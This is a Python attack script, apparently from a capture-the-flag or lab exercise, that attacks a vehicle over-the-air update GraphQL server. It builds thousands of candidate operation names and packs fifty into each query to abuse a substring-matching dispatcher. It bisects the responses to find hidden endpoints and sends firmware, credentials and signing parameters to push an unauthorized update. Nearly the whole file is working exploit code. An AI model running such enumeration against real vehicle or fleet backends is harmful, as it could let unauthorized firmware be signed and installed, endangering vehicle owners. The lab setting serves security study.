#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Stage D3: exhaustive combinatorial name shotgun.

Positive control (EV/D3_control.json) proved the matcher is a pure substring
test on the query text: a 20 000-byte query containing "vehicleDiagnostics"
still dispatches.  So one request can test ~50 candidate names, and a few dozen
requests can cover thousands of names.

Vocabulary is seeded by the target's own wording:
  /api/v1/objectives/final -> "VCU has not committed an authorized update"
so "authorized"/"commit"/"update" are high-value stems.
"""
import base64, hashlib, itertools, json, os
import requests
from concurrent.futures import ThreadPoolExecutor

HERE = os.path.dirname(os.path.abspath(__file__))
EV = os.path.abspath(os.path.join(HERE, "..", "..", "03_EVIDENCE", "sign"))
URL = "http://10.225.139.2:8080/graphql"
VIN = "CV622697F82A936A1"
CAMP = "CAMP-243892C376D4CB2D5F826953"
CRED = "5e7f07b4a81153ecd5868cc02557f823"
PKG = "3ac02bb40567fa14062cc768e22fefac3dd972aee87a3bf2d01419f026d573d0"
FW = open(os.path.join(HERE, "..", "..", "work", "bundle2", "x", "vcu-reference.bin"), "rb").read()
SHA = hashlib.sha256(FW).hexdigest()
B64 = base64.b64encode(FW).decode()
GUEST = '{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'

A = ["vehicle", "vehicles", "ota", "firmware", "fw", "vcu", "campaign", "campaigns",
     "update", "updates", "package", "packages", "image", "images", "ecu", "software",
     "release", "artifact", "flash", "boot", "bootloader", "authorization", "authorize",
     "authorized", "signing", "signature", "sign", "digest", "attestation", "diagnostic",
     "diagnostics", "engineering", "fleet", "cloud", "rollback", "reference", "commit",
     "committed", "submission", "submit", "approval", "approve", "manifest", "payload",
     "bundle", "delivery", "provision", "firmwareUpdate", "vehicleUpdate", "otaUpdate",
     "vcuUpdate", "updatePackage", "authorizedUpdate", "firmwarePackage", "vehiclePackage",
     "vcuPackage", "signedUpdate", "updateSignature", "authorizedFirmware"]
B = ["Sign", "Signature", "Signing", "SigningRequest", "SignRequest", "SignUpdate",
     "SignFirmware", "SignPackage", "SignImage", "Update", "UpdateSign", "Authorize",
     "Authorization", "AuthorizeUpdate", "Commit", "CommitUpdate", "Approve", "Submit",
     "Verify", "Issue", "Grant", "Request", "Create", "Get", "Fetch", "Read", "Load",
     "Reference", "ReferenceSignature", "Package", "Artifact", "Bundle", "Digest",
     "AuthorizedUpdate", "UpdateAuthorization", "SigningKey", "PublicKey", "Certificate",
     "Credential", "Token", "Ticket"]

NAMES = set()
for x in A:
    NAMES.add(x)
    for y in B:
        NAMES.add(x + y)
        NAMES.add(y + x[0].upper() + x[1:])
NAMES |= set("""
sign signFirmware otaSign signUpdate vehicleUpdateSign firmwareSign vehicleSign
otaSignFirmware vehicleCampaign vehicleOta vehiclePackage vehicleVcu vehicleUpdate
vehicleSignature vehicleFirmwareSignature otaSignature updateSignature
vehicleUpdateSignature firmwareSignature vehicleOtaSignature vehicleVcuSignature
signVehicleUpdate signVehicleFirmware signOtaUpdate signVcuUpdate
vehicleUpdateAuthorization vehicleAuthorization otaUpdateAuthorization
firmwareUpdateAuthorization campaignAuthorization vehicleFirmwareUpdate
vehicleSoftwareUpdate vehicleEcuUpdate vcuReferenceSignature signVcuReference
authorizedUpdate commitAuthorizedUpdate commitUpdate submitAuthorizedUpdate
vehicleAuthorizedUpdate otaAuthorizedUpdate firmwareAuthorizedUpdate
authorizedFirmwareUpdate authorizedVehicleUpdate authorizedOtaUpdate
vcuAuthorizedUpdate signedFirmware signedUpdate certifiedUpdate certifiedFirmware
signatureRequest firmwareSignatureRequest updateSignatureRequest
vehicleSignatureRequest otaSignatureRequest vcuSignatureRequest
diagnosticTicket firmwareTicket otaTicket updateTicket ticket tickets
firmwareSigning signFirmwareUpdate signVehicleFirmwareUpdate
vehicleFirmwareSignRequest otaPackageSignature packageSignature
engineeringBundle engineeringSignature engineeringSign
""".split())
NAMES = sorted(n for n in NAMES if n)
print(f"[*] {len(NAMES)} candidate names")

VARS = {"vin": VIN, "campaignId": CAMP, "rollback": 2, "firmware": B64,
        "firmwareHex": FW.hex(), "firmwareBase64": B64, "firmwareSha256": SHA,
        "sha256": SHA, "digest": SHA, "hash": SHA, "size": 1024, "length": 1024,
        "address": "0x08040000", "updateAddress": "0x08040000",
        "vcuUpdateAddress": "0x08040000", "packageKey": PKG,
        "firmwareCredential": CRED, "credential": CRED, "key": CRED,
        "vcuReference": B64, "image": B64, "payload": B64, "data": B64,
        "reference": B64, "vcuRollback": 2, "vcuReferenceSize": 1024,
        "campaign": CAMP, "vehicleId": VIN, "targetVin": VIN,
        "signature": SHA, "sig": SHA, "signed": True, "sign": True,
        "authorize": True, "commit": True, "force": True, "type": "ECDSA-P256",
        "alg": "ECDSA-P256", "curve": "P-256", "hashAlg": "SHA-256", "slot": "vcu"}


def post(q, v):
    r = requests.post(URL, json={"query": q, "variables": v}, timeout=15)
    return r.status_code, r.text.strip()


def chunk(l, n):
    for i in range(0, len(l), n):
        yield l[i:i + n]


def main():
    jobs = list(chunk(NAMES, 50))
    print(f"[*] {len(jobs)} shotgun requests")

    def run(ch):
        st, txt = post(" ".join(ch), VARS)
        return {"chunk": ch, "status": st, "guest": txt == GUEST, "resp": txt[:1500]}

    with ThreadPoolExecutor(max_workers=10) as ex:
        res = list(ex.map(run, jobs))
    json.dump(res, open(os.path.join(EV, "D3_shotgun.json"), "w"), indent=1)
    bad = [r for r in res if not r["guest"]]
    print(f"[*] non-guest: {len(bad)}")
    found = []
    for r in bad:
        cand = r["chunk"]
        while len(cand) > 1:
            mid = len(cand) // 2
            a, b = cand[:mid], cand[mid:]
            cand = a if post(" ".join(a), VARS)[1] != GUEST else b
        st, txt = post(cand[0], VARS)
        found.append({"name": cand[0], "status": st, "resp": txt[:1500]})
        print(f"  >>> HIT {cand[0]} -> {st} {txt[:400]}")
    json.dump(found, open(os.path.join(EV, "D3_shotgun_bisected.json"), "w"), indent=1)
    print("[*] done; hits =", [f["name"] for f in found])


if __name__ == "__main__":
    main()
